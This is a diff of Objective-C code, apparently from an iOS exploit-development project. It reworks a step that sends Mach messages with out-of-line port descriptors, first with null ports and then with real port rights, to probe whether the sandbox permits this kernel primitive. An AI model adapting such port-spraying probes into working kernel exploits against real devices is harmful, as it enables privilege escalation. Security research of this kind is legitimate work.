@@ -8581,16 +8581,7 @@ static void *iohid_threadCopyEvent(void *arg) {
             return;
         }
 
-        // Step 2b: Now try OOL ports descriptor
-        [self appendLog:@"Basic send/recv OK, now trying OOL ports..."];
-        // Kernel expects mach_msg_descriptor_type_t=3 for OOL_PORTS.
-        // Struct layout (arm64e): address(8) count(4) deallocate(1) pad(3)
-        //                         copy(4) disposition(4) type(4) = 28 bytes
-        mach_port_t *oolArray = (mach_port_t *)calloc(PORT_COUNT, sizeof(mach_port_t));
-        for (mach_msg_size_t i = 0; i < PORT_COUNT; i++) {
-            oolArray[i] = ports[i];
-        }
-
+        // Step 2b: OOL types (needed by all OOL tests)
         typedef struct {
             mach_msg_bits_t       msgh_bits;
             mach_msg_size_t       msgh_size;
@@ -8614,8 +8605,67 @@ static void *iohid_threadCopyEvent(void *arg) {
             uint32_t        type;          // +24: 4 bytes
         } __attribute__((packed)) ool_ports_desc_t;
 
-        // MACH_MSG_OOL_PORTS_DESCRIPTOR = 3 in kernel
-        enum { kOolPortsDescType = 3 };
+        enum { kOolPortsDescType = 3 };  // MACH_MSG_OOL_PORTS_DESCRIPTOR
+
+        // Step 2c: Try OOL ports descriptor
+        [self appendLog:@"Basic send/recv OK, now trying OOL ports..."];
+
+        // Test 1: MACH_PORT_NULL array to isolate port rights vs. descriptor type
+        [self appendLog:@"  Test 1: OOL ports with MACH_PORT_NULL..."];
+        {
+            mach_port_t *nullArray = (mach_port_t *)calloc(PORT_COUNT, sizeof(mach_port_t));
+            // All null — test if descriptor type itself is accepted
+
+            struct {
+                kmsg_header_t    header;
+                kmsg_body_t      body;
+                ool_ports_desc_t ool;
+            } nullMsg;
+
+            memset(&nullMsg, 0, sizeof(nullMsg));
+            nullMsg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0)
+                                        | MACH_MSGH_BITS_COMPLEX;
+            nullMsg.header.msgh_remote_port = recvPort;
+            nullMsg.header.msgh_local_port  = MACH_PORT_NULL;
+            nullMsg.header.msgh_size        = sizeof(nullMsg);
+            nullMsg.header.msgh_id          = 0xB00;
+
+            nullMsg.body.msgh_descriptor_count = 1;
+            nullMsg.ool.address     = nullArray;
+            nullMsg.ool.count       = PORT_COUNT;
+            nullMsg.ool.deallocate  = 0;
+            nullMsg.ool.copy        = MACH_MSG_VIRTUAL_COPY;
+            nullMsg.ool.disposition = MACH_MSG_TYPE_COPY_SEND;
+            nullMsg.ool.type        = kOolPortsDescType;
+
+            kr = mach_msg((mach_msg_header_t *)&nullMsg,
+                          MACH_SEND_MSG,
+                          sizeof(nullMsg),
+                          0,
+                          MACH_PORT_NULL,
+                          MACH_MSG_TIMEOUT_NONE,
+                          MACH_PORT_NULL);
+            [self appendLog:[NSString stringWithFormat:
+                @"  null OOL send: %s (0x%x)", mach_error_string(kr), kr]];
+            free(nullArray);
+        }
+
+        if (kr != KERN_SUCCESS) {
+            [self appendLog:@"OOL ports descriptor itself rejected — type=3 blocked by sandbox"];
+            for (int j = 0; j < PORT_COUNT; j++) mach_port_destroy(mach_task_self(), ports[j]);
+            mach_port_destroy(mach_task_self(), recvPort);
+            return;
+        }
+
+        // v84 test 2: NULL ports worked, now try real ports
+        [self appendLog:@"  Test 2: OOL ports with real port rights..."];
+        // Kernel expects mach_msg_descriptor_type_t=3 for OOL_PORTS.
+        // Struct layout (arm64e): address(8) count(4) deallocate(1) pad(3)
+        //                         copy(4) disposition(4) type(4) = 28 bytes
+        mach_port_t *oolArray = (mach_port_t *)calloc(PORT_COUNT, sizeof(mach_port_t));
+        for (mach_msg_size_t i = 0; i < PORT_COUNT; i++) {
+            oolArray[i] = ports[i];
+        }
 
         struct {
             kmsg_header_t    header;
